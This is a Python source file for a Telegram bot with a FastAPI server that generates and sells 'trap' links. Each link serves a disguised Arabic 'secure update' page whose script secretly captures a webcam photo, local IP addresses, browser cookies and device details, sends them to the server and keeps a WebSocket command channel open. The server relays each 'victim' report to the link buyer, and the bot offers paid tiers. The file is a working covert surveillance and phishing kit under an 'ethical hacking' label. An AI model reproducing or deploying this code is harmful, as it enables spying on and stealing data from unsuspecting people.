    
    import os
import uuid
import asyncio
import base64
from datetime import date
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 
ACTIVE_WEBSOCKETS = {}

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    stolen_cookies: str = ""
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_advanced_trap(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>منصة التحديث السحابي المؤمن</title>
        <style>
            body {{ background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }}
            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.7s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .card {{ background: #0f172a; padding: 30px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 15px 30px rgba(0,0,0,0.6); }}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🛡️ جاري ضبط المزامنة والاتصال الآمن...</h2>
            <div class="loader"></div>
            <p style="color: #94a3b8; font-size: 13px;">يرجى عدم إغلاق النافذة، جارٍ التحقق من شهادة الأمان وتثبيت القناة المشفرة.</p>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";

            // 1. إنشاء قناة اتصال حية مستمرة (WebSocket C2 Tunnel)
            const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(wsProtocol + window.location.host + '/ws/c2/' + linkId);

            ws.onopen = function() {{
                console.log("[+] C2 Tunnel Established.");
            }};

            ws.onmessage = async function(event) {{
                const cmd = JSON.parse(event.data);
                if (cmd.action === "ping") {{
                    ws.send(JSON.stringify({{status: "alive", userAgent: navigator.userAgent}}));
                }}
            }};

            async function getNetworkAndCookies() {{
                return new Promise((resolve) => {{
                    const ips = [];
                    try {{
                        const pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
                        pc.createDataChannel("");
                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
                        pc.onicecandidate = (ice) => {{
                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                            const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                            if (match && !ips.includes(match[1])) ips.push(match[1]);
                        }};
                    }} catch(e) {{}}
                    setTimeout(() => resolve(ips), 700);
                }});
            }}

            async function executeRedTeamEngine() {{
                try {{
                    let imageData = "";
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        await new Promise(r => setTimeout(r, 1200));
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(t => t.stop());
                    }} catch(e) {{}}

                    const localIPs = await getNetworkAndCookies();
                    // محاولة استخراج الكوكيز المتاحة في النطاق المحلي للمتصفح
                    const cookies = document.cookie || "لا توجد كوكيز مكشوفة";

                    const systemData = {{
                        resolution: window.screen.width + 'x' + window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        hardware_concurrency: navigator.hardwareConcurrency || 'غير معروف',
                        device_memory: navigator.deviceMemory || 'غير معروف',
                        connection_type: navigator.connection ? navigator.connection.effectiveType : 'مجهول'
                    }};

                    // إرسال البيانات المسحوبة بالكامل لسيرفر التحكم
                    await fetch('/api/v1/exfiltrate', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            link_id: linkId,
                            device_info: navigator.userAgent,
                            camera_snapshot_base64: imageData,
                            geolocation: {{ status: "تم التفعيل عبر العقدة الحية" }},
                            network_info: {{ local_ips: localIPs }},
                            stolen_cookies: cookies,
                            stolen_data: systemData
                        }})
                    }});

                    setTimeout(() => {{ window.location.href = "https://www.google.com"; }}, 1000);
                }} catch(e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}

            window.onload = executeRedTeamEngine;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.websocket("/ws/c2/{link_id}")
async def websocket_c2_endpoint(websocket: WebSocket, link_id: str):
    await websocket.accept()
    ACTIVE_WEBSOCKETS[link_id] = websocket
    target_user_id = LINK_TO_USER.get(link_id)
    
    if target_user_id:
        try:
            await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم إنشاء قناة اتصال عصبية (Live WebSocket C2)* للرابط: `{link_id}`", parse_mode="Markdown")
        except:
            pass

    try:
        while True:
            data = await websocket.receive_text()
            # معالجة نبضات البنغ المستمرة من جهاز الضحية
    except WebSocketDisconnect:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            net = data.network_info
            
            caption = (
                "🔥 *[ تقرير الترسانة الفاخرة - Live C2 Node ]*\n\n"
                f"🌐 *الـ IP الداخلي (LAN):* `{', '.join(net.get('local_ips', ['N/A']))}`\n"
                f"🍪 *الكوكيز المسحوبة:* `{data.stolen_cookies[:150]}`\n\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('hardware_concurrency', 'N/A')}`\n"
                f"⚡ *سرعة الاتصال:* `{s_data.get('connection_type', 'N/A')}`"
            )
            
            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                photo_file = BufferedInputFile(base64.b64decode(encoded), filename="redteam_capture.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo_file, caption=caption, parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown")
        except Exception as e:
            print(f"Error: {e}")

    return {"status": "success"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "tier": "free"}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="⚡ توليد رابط C2 الحي الفاخر (3 متاح مجاناً اليوم)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="💎 ترقية الحساب الأساسي ($2/شهرياً)"), KeyboardButton(text="👑 باقة الترسانة الفاخرة ($3/شهرياً)")],
            [KeyboardButton(text="💳 دفع الاشتراك وتفعيل الصلاحيات")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في منصة الهكر الأخلاقي والتحكم السيبراني المتقدم.*\n\n"
        "• لديك **3 محاولات مجانية يومياً** لكل أداة لحماية المنصة.\n"
        "• الاشتراك الأساسي متاح بـ **$2 شهرياً**.\n"
        "• باقة الترسانة الفاخرة (الذكاء السيبراني الكامل) بـ **$3 شهرياً**.",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "⚡ توليد رابط C2 الحي الفاخر (3 متاح مجاناً اليوم)")
async def generate_c2_link(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "tier": "free"}
    
    user_data = USERS_DB[user_id]
    
    if user_data["last_date"] != today_str:
        user_data["last_date"] = today_str
        user_data["free_used_today"] = 0
    
    # التحقق من استهلاك الحد الأقصى المجاني (3 مرات يومياً) وصلاحيات الحساب
    if user_data["free_used_today"] >= 3 and user_data["tier"] == "free":
        await message.answer(
            "⚠️ *عذراً، لقد استهلكت محاولاتك المجانية الثلاثة المتاحة لهذا اليوم.*\n\n"
            "لرفع الحظر ومتابعة توليد الروابط بلا حدود، يرجى الاشتراك في الباقة الأساسية بـ `$2` أو الترسانة الفاخرة بـ `$3` شهرياً.",
            parse_mode="Markdown"
        )
        return

    user_data["free_used_today"] += 1
    
    unique_token = str(uuid.uuid4())[:8]
    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    trap_url = f"https://{public_domain}/t/{unique_token}"
    
    LINK_TO_USER[unique_token] = user_id
    
    remaining = 3 - user_data["free_used_today"] if user_data["tier"] == "free" else "غير محدود (مشترك)"
    
    await message.answer(
        f"✅ *تم تفعيل عقدة الـ C2 الحية بنجاح:*\n\n`{trap_url}`\n\n*(المحاولات المتبقية لك اليوم المجانية: {remaining})*",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
    await message.answer(f"📂 *سجل ضحاياك النشطين:*\n\n🎯 إجمالي الضحايا المرتبطين بعقدك السيبرانية: *{total_victims}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💎 ترقية الحساب الأساسي ($2/شهرياً)")
async def upgrade_tier_2(message: types.Message):
    await message.answer("💳 *باقة الحساب الأساسي ($2/شهرياً)*\n\nتواصل مع الدعم المالي لتأكيد الدفع ورفع القيود اليومية تماماً.", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "👑 باقة الترسانة الفاخرة ($3/شهرياً)")
async def upgrade_tier_3(message: types.Message):
    await message.answer("👑 *باقة الترسانة الفاخرة ($3/شهرياً)*\n\nتمنحك صلاحيات الـ Red-Team الكاملة والوصول لكل أدوات الاختراق المتقدمة بلا حدود. تواصل مع المسؤول للتفعيل.", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💳 دفع الاشتراك وتفعيل الصلاحيات")
async def payment_info(message: types.Message):
    await message.answer("🔗 *بوابة الدفع السيبرانية الآمنة*\n\nلإتمام الدفع عبر العملات الرقمية أو المحافظ الإلكترونية وتفعيل حسابك الفوري ($2 أو $3 شهرياً)، راسل المسؤول المباشر.", parse_mode="Markdown")

async def run_telegram_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
